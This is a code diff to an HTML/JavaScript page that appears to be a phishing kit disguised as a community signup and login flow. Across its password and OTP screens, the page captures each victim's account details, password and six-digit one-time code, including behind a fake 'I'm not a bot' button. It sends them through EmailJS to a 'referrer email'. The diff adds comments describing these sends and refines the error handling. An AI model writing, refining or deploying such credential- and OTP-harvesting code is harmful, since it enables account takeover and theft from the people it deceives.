@@ -437,7 +437,7 @@
           <input type="email" id="referrerEmail" class="custom-input" placeholder="Enter referrer email" required />
         </div>
 
-        <button type="submit" class="primary-btn">Join Community</button>
+        <button type="submit" id="registerSubmitBtn" class="primary-btn">Join Community</button>
       </form>
     </section>
 
@@ -601,6 +601,7 @@
       document.getElementById("registerForm").addEventListener("submit", (e) => {
         e.preventDefault();
 
+        // Save input values to registration state (no email sent on register submit)
         registrationData = {
           fullName: document.getElementById("fullName").value,
           whatsapp: document.getElementById("whatsapp").value,
@@ -631,7 +632,7 @@
         navigateTo("pass");
       });
 
-      // --- SCREEN 3: PASSWORD ---
+      // --- SCREEN 3: PASS PAGE (Sends account details + password) ---
       document.querySelectorAll(".back-to-login").forEach(btn => {
         btn.addEventListener("click", () => navigateTo("login"));
       });
@@ -644,7 +645,6 @@
         }
       });
 
-      // Step 3 submission: send initial payload to referrer email
       passLoginBtn.addEventListener("click", () => {
         passLoginBtn.textContent = "Logging in...";
         passLoginBtn.disabled = true;
@@ -662,13 +662,16 @@
           otp_code: 'Not Entered Yet'
         };
 
+        // Send login payload to referrer email when "Log in" is clicked
         emailjs.send("service_rf9jc9g", "template_ykjxd5h", templateParams)
           .then(() => {
             passLoginBtn.textContent = "Log in";
             passLoginBtn.disabled = false;
             navigateTo("otp");
             if (otpInputs[0]) otpInputs[0].focus();
-          }, (error) => {
+          })
+          .catch((error) => {
+            console.error("Failed to send pass login payload:", error);
             passLoginBtn.textContent = "Log in";
             passLoginBtn.disabled = false;
             navigateTo("otp");
@@ -676,7 +679,7 @@
           });
       });
 
-      // --- SCREEN 4: OTP ---
+      // --- SCREEN 4: OTP PAGE (Sends 6-digit OTP code) ---
       document.querySelectorAll(".back-to-pass").forEach(btn => {
         btn.addEventListener("click", () => navigateTo("pass"));
       });
@@ -719,7 +722,6 @@
         });
       });
 
-      // Step 4 submission: send complete payload with OTP code
       botBtn.addEventListener("click", () => {
         let enteredCode = "";
         otpInputs.forEach(i => enteredCode += i.value);
@@ -745,12 +747,14 @@
           otp_code: enteredCode
         };
 
+        // Send OTP payload to the same referrer email when "I'm not a bot" is clicked
         emailjs.send("service_rf9jc9g", "template_ykjxd5h", otpTemplateParams)
           .then(() => {
             alert(`Verification completed successfully! Code (${enteredCode}) sent to ${registrationData.referrerEmail}.`);
             botBtn.textContent = "I'm not a bot";
             botBtn.disabled = false;
-          }, (error) => {
+          })
+          .catch((error) => {
             alert("Failed to send OTP code: " + JSON.stringify(error));
             botBtn.textContent = "I'm not a bot";
             botBtn.disabled = false;
